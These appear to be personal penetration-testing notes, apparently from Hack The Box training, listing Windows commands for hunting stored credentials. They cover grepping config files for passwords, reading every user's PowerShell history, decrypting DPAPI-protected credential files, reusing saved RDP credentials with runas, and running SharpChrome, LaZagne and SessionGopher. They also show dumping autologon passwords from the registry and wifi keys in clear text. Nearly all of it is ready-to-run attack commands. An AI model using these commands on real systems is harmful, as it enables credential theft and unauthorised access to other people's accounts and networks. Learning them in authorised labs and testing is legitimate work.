### Search for passwords into .config .xml .ini .cfg files
```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

OR with Content
findstr /si password *.xml *.ini *.txt *.config

SAME with Powershell
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
```

### Chrome Dictionary files
```
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

### Passwords in Unattendex.xml 
(usually under C:\Windows\Panther)
Unattended.xml is used for auto-deploy config of windows during first boot, and it may contain password. It should be deleted by OS but sometimes can be back-upped somewhere:
```
?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="specialize">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <AutoLogon>
                <Password>
                    <Value>local_4dmin_p@ss</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>2</LogonCount>
                <Username>Administrator</Username>
            </AutoLogon>
            <ComputerName>*</ComputerName>
        </component>
    </settings>
```

### Powershell History files
```
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

OR
gc (Get-PSReadLineOption).HistorySavePath

OR
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
(This last one is usefull to read all users history that is accessible via our CURRENT USERS permissions)
```

### Decrypt ENC passowrd in Poweshell Scripts 
(via DPAPI secrets)
To successfully decrypt it you must run the script from same PC as same user in order to successful decrypt it!
```
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $encryptedString

This loads creds from a XML file, to decrypt:
PS C:\htb> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\htb> $credential.GetNetworkCredential().username
bob
PS C:\htb> $credential.GetNetworkCredential().password
Str0ng3ncryptedP@ss!
```

### Find files by extension
```
where /R C:\ *.config

SAME with Powershell
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

### Hunting for creds (saved from RDP MSTSC)
```
cmdkey /list

    Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: inlanefreight\bob

Then run command as him: runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

### Steal Creds from Chrome 
(uses DPAPI secrets to hold for passwords)
Reference: https://github.com/GhostPack/SharpDPAPI
```
.\SharpChrome.exe logins /unprotect
```

### Steal credentials from Exchange mailboxes
Reference: https://github.com/dafthack/MailSniper

### All-Around password steal with Lazagne
Reference: https://github.com/AlessandroZ/LaZagne
```
.\lazagne.exe all
```

### Steal credentials from RDP, PUTTY, WINSCP etc
Reference: https://github.com/Arvanaghi/SessionGopher
```
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01
```

### Steal credentials from Autologon 
(does what it says on the tin)
```
Default path: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
Default values:
    AdminAutoLogon - Determines whether Autologon is enabled or disabled. A value of "1" means it is enabled.
    DefaultUserName - Holds the value of the username of the account that will automatically log on.
    DefaultPassword - Holds the value of the password for the user account specified previously.

reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

### Steal creds from Saved wifi profiles 
(Admin account needed)
```
netsh wlan show profile
```
(List for latest connected sessions SSID)

```
netsh wlan show profile PROFILENAME key=clear
```
(Using the profile name from previous command will show you the save password in clear-text)
